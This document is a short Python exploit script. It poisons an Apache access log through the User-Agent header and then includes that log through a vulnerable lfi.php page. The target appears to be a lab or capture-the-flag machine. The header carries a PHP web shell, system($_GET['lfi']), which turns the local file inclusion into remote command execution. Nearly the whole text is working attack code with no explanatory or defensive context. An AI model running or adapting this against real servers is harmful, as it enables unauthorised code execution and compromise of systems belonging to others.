#!/usr/bin/env python3

import requests

s = requests.Session()
ip= '10.10.48.53'
url = f"http://{ip}:80/lfi/lfi.php?page=/var/log/apache2/access.log"

# injecting php code in the headers
headers = {'User-Agent': "Mozilla/5.0 <?php system($_GET['lfi']) ?> Firefox/70.0"}

r = s.get(url, headers=headers)
print(r.headers)
print(r.text)
